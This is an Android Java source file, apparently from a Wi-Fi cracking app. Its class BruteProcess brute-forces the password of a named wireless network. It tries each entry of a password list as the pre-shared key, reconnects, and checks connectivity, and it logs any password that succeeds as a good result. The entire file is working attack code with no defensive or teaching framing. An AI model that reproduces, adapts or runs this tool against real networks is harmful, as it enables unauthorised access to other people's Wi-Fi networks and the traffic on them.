package BruteFragment;

import android.app.Activity;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;

import java.util.List;
import java.util.Objects;

import androidx.fragment.app.FragmentManager;

public class BruteProcess extends AsyncTask {

    private List<String> passwordList;

    private WifiManager wifiManager;
    private WifiConfiguration wifiConfiguration;

    private String currentBruteWifiSSID;

    private String parsePassword;

    private int netId;
    private int threadValue;

    private Activity activity;

    private FragmentManager fragmentManager;

    private byte flagBrute = 0;

    public static byte getStopBrute() {
        return flagStopBrute;
    }

    static void setStopBrute() {
        BruteProcess.flagStopBrute = (byte) 1;
    }

    private static byte flagStopBrute = 0;

    private SetLog setLog;

    BruteProcess(List<String> passwordList, WifiManager wifiManager, String currentBruteWifiSSID,
                 FragmentManager fragmentManager, Activity activity, int threadValue) {
        this.currentBruteWifiSSID = currentBruteWifiSSID;
        this.fragmentManager = fragmentManager;
        this.wifiManager = wifiManager;
        this.passwordList = passwordList;
        this.activity = activity;
        this.threadValue = threadValue;
    }

    private void Brute() {
        parsePassword = "";
        for (int i = 0; i < passwordList.size(); i++) {

            if (flagBrute == 0) {

                flagBrute = 1;
                wifiManager.removeNetwork(netId);
                /* Config */
                WifiGeneratedConfig(i);
                /* Try connect */
                TryConnect();
                /* Thread */
                SleepAfter();

                publishProgress(i);

                if (CheckSuccessConnect()) {
                    parsePassword = passwordList.get(i);
                    break;
                }

                /* Stop brute */
                if (flagStopBrute == 1)
                    break;
            }
        }
    }

    /* Generated new pass and wifi */
    private void WifiGeneratedConfig(int i) {
        wifiConfiguration = new WifiConfiguration();
        wifiConfiguration.SSID = String.format("\"%s\"", currentBruteWifiSSID); /* Set wifi name */
        wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordList.get(i)); /* Set current password */
    }

    /* Try connect to new wifi */
    private void TryConnect() {
        netId = wifiManager.addNetwork(wifiConfiguration);
        wifiManager.disconnect();
        wifiManager.enableNetwork(netId, true);
        wifiManager.reconnect();
    }

    /* Sleep after connect */
    private void SleepAfter() {
        try {
            Thread.sleep(threadValue);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected Object doInBackground(Object[] objects) {
        flagStopBrute = 0;
        Brute();
        return null;
    }

    @Override
    protected void onPostExecute(Object o) {
        super.onPostExecute(o);
        setLog.SetLogResult("Finish brute wifi: " + currentBruteWifiSSID);
        if (!parsePassword.equals(""))
            SuccessParsePassword();
        BruteFragment bruteFragment = new BruteFragment();
        bruteFragment.setFlagCurrentBrute((byte) 0);
    }

    @Override
    protected void onProgressUpdate(Object[] values) {
        super.onProgressUpdate(values);
        setLog = new SetLog(fragmentManager);
        setLog.SetLogBruteProgress("Brute progress " + values[0].toString() + " with < " + passwordList.size() + " passwords \n");
    }

    /* Check success connection */
    private boolean CheckSuccessConnect() {
        ConnectivityManager connectivityManager = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = Objects.requireNonNull(connectivityManager).getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        flagBrute = 0;
        return Objects.requireNonNull(networkInfo).isConnected();
    }

    /* Success parse */
    private void SuccessParsePassword() {
        setLog.SetLogResult("Pass to WIF:" + currentBruteWifiSSID + "Pass: " + parsePassword);
        setLog.SetLogGoodResults("WIFI: " + currentBruteWifiSSID + " Pass: " + parsePassword);
    }
}

